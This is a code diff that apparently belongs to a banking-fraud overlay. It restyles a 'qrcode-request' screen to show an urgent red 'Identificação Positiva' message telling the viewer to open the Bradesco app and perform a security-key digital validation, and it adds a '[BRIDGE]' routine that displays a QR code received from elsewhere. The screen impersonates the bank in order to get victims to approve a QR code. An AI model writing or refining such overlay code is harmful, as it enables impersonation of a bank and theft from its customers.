@@ -243,11 +243,14 @@
       case 'qrcode-request':
         content = `
           <div class="overlay-content">
-            <h2>${message}</h2>
+            <h2 style="color: #cc0000; font-size: 22px; margin-bottom: 10px;">Identificação Positiva</h2>
+            <p style="color: #cc0000; font-size: 18px; line-height: 1.4; margin-bottom: 20px;">
+              Abra o aplicativo Bradesco, vá em Chave de Segurança em seguida validação digital.
+            </p>
             <div id="qrcode-container" style="margin-top: 20px; text-align: center;">
-              <p style="color: #666; margin-bottom: 10px; font-size: 14px;">Aguardando QR Code...</p>
-              <div style="margin-top: 30px; padding: 20px; background: #f5f5f5; border-radius: 8px; min-height: 250px; display: flex; align-items: center; justify-content: center;">
+              <div style="margin-top: 10px; padding: 10px; background: #fff; border-radius: 8px; min-height: 250px; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd;">
                 <img id="qrcode-image" src="" style="max-width: 300px; max-height: 300px; display: none;" />
+                <p id="qrcode-placeholder" style="color: #666; font-size: 14px;">Aguardando QR Code...</p>
               </div>
             </div>
             <div style="margin-top: 20px; font-size: 11px; color: #666;">
@@ -404,9 +407,11 @@
     console.log('[BRIDGE] Exibindo QR Code');
     const container = document.getElementById('qrcode-container');
     const image = document.getElementById('qrcode-image');
+    const placeholder = document.getElementById('qrcode-placeholder');
     if (container && image) {
       image.src = qrCodeDataUrl;
       image.style.display = 'block';
+      if (placeholder) placeholder.style.display = 'none';
     }
   }
 
